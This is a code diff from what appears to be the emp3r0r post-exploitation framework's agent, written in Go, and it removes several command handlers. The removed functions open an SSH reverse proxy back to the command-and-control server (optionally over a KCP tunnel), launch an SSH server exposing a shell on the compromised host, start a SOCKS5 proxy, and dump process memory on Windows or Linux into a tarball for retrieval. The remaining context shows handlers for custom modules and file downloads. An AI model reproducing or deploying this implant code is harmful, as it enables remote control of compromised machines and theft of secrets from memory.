@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-	"runtime"
 	"sort"
 	"strconv"
 	"strings"
@@ -17,14 +16,11 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/ssh"
+
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
-	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/listener"
-	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
 )
@@ -126,126 +122,6 @@ func runStat(cmd *cobra.Command, args []string) {
 		return
 	}
 	c2transport.NotifyC2Binary(cmd, data)
-}
-
-// runBring2CC implements !bring2cc --addr <target> --kcp <on/off>
-func runBring2CC(cmd *cobra.Command, args []string) {
-	addr, _ := cmd.Flags().GetString("addr")
-	kcp, _ := cmd.Flags().GetString("kcp")
-	if addr == "" {
-		c2transport.NotifyC2(cmd, "Error: no address\n")
-		return
-	}
-	useKCP := kcp == "on"
-	msg := fmt.Sprintf("Bring2CC: Reverse proxy for %s finished\n", addr)
-
-	hasInternet := transport.TestConnectivity(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
-	isProxyOK := transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress)
-	if !hasInternet && !isProxyOK {
-		c2transport.NotifyC2(cmd, "Error: We don't have any internet to share\n")
-		return
-	}
-	ReverseConns.Range(func(p, cancelfunc any) bool {
-		if addr == p.(string) {
-			cancelfunc.(context.CancelFunc)()
-		}
-		return true
-	})
-	targetAddrWithPort := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.Bring2CCReverseProxyPort)
-	ctx, cancel := context.WithCancel(context.Background())
-	kcpListenPort := fmt.Sprintf("%d", util.RandInt(10000, 60000))
-	if useKCP {
-		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
-		kcpServerAddr := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.KCPServerPort)
-		go func() {
-			defer func() {
-				if r := recover(); r != nil {
-					logging.Errorf("KCPTunClient panic: %v\n%s", r, util.CallStack())
-				}
-			}()
-			transport.KCPTunClient(kcpServerAddr, kcpListenPort, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
-		}()
-		// wait for KCP client to start
-		for i := 0; i < 20; i++ {
-			if netutil.IsPortOpen("127.0.0.1", kcpListenPort) {
-				break
-			}
-			time.Sleep(100 * time.Millisecond)
-		}
-	}
-	proxyPort, err := strconv.Atoi(common.RuntimeConfig.AgentSocksServerPort)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		cancel()
-		return
-	}
-	if def.ProxyServer == nil {
-		def.ProxyServer, err = common.NewSocks5ProxyServer()
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error re-initializing ProxyServer: %v\n", err)
-			cancel()
-			return
-		}
-	}
-	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &ReverseConns, def.ProxyServer, ctx, cancel)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "%v\n", err)
-		return
-	}
-	c2transport.NotifyC2(cmd, "%s", msg)
-}
-
-// runSSHD implements !sshd --shell <shell> --port <port> --args <args>
-func runSSHD(cmd *cobra.Command, args []string) {
-	shell, _ := cmd.Flags().GetString("shell")
-	port, _ := cmd.Flags().GetString("port")
-	sshdArgs, _ := cmd.Flags().GetStringSlice("args")
-	if shell == "" || port == "" {
-		c2transport.NotifyC2(cmd, "Error: args error\n")
-		return
-	}
-	logging.Infof("Got sshd request: %v", args)
-	errChan := make(chan error)
-	go func() {
-		defer func() {
-			if r := recover(); r != nil {
-				logging.Errorf("SSHD panic: %v\n%s", r, util.CallStack())
-				errChan <- fmt.Errorf("SSHD panic: %v", r)
-			}
-		}()
-		errChan <- ssh.SSHD(shell, port, sshdArgs)
-	}()
-	for !netutil.IsPortOpen("127.0.0.1", port) {
-		time.Sleep(50 * time.Millisecond)
-	}
-	select {
-	case err := <-errChan:
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		} else {
-			c2transport.NotifyC2(cmd, "success\n")
-		}
-	case <-time.After(3 * time.Second):
-		c2transport.NotifyC2(cmd, "SSHD started successfully\n")
-	}
-}
-
-// runProxy implements !proxy --mode <mode> --addr <address>
-func runProxy(cmd *cobra.Command, args []string) {
-	mode, _ := cmd.Flags().GetString("mode")
-	addr, _ := cmd.Flags().GetString("addr")
-	if mode == "" || addr == "" {
-		c2transport.NotifyC2(cmd, "Error: args error\n")
-		return
-	}
-	logging.Infof("Got proxy request: %v", args)
-	err := modules.Socks5Proxy(mode, addr)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: Failed to start Socks5Proxy: %v\n", err)
-		return
-	}
-	c2transport.NotifyC2(cmd, "Socks5Proxy server ready with username %s and password %s\n",
-		common.RuntimeConfig.ShadowsocksLocalSocksPort, common.RuntimeConfig.Password)
 }
 
 // runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
@@ -540,58 +416,6 @@ func runFileDownloader(cmd *cobra.Command, args []string) {
 		return
 	}
 	c2transport.NotifyC2(cmd, "File downloaded to %s\n", path)
-}
-
-// runMemDump implements !mem_dump --pid <pid>
-func runMemDump(cmd *cobra.Command, args []string) {
-	pid, _ := cmd.Flags().GetInt("pid")
-	if pid == 0 {
-		c2transport.NotifyC2(cmd, "Error: invalid PID\n")
-		return
-	}
-	outPath := fmt.Sprintf("%s/%d", os.TempDir(), pid)
-	err := os.MkdirAll(outPath, 0o700)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		return
-	}
-	tarball := fmt.Sprintf("%d.tar.xz", pid)
-	switch runtime.GOOS {
-	case "windows":
-		tarball = strings.ReplaceAll(tarball, "\\", "/")
-		filePath := fmt.Sprintf("%s/%d.bin", outPath, pid)
-		err = util.MiniDumpProcess(pid, filePath)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error (minidump): %v\n", err)
-			return
-		}
-	case "linux":
-		dumpedData, err := util.DumpProcMem(pid)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-			return
-		}
-		for base, data := range dumpedData {
-			filePath := fmt.Sprintf("%s/%d_%d.bin", outPath, pid, base)
-			err = util.WriteFileAgent(filePath, data, 0o600)
-			if err != nil {
-				c2transport.NotifyC2(cmd, "Error: %v\n", err)
-				return
-			}
-		}
-	}
-	err = os.Chdir(os.TempDir())
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		return
-	}
-	err = util.TarXZ(fmt.Sprintf("%d", pid), tarball)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		return
-	}
-	defer os.RemoveAll(outPath)
-	c2transport.NotifyC2(cmd, "%s\n", tarball)
 }
 
 // getMemFileCompletions works as ls completion
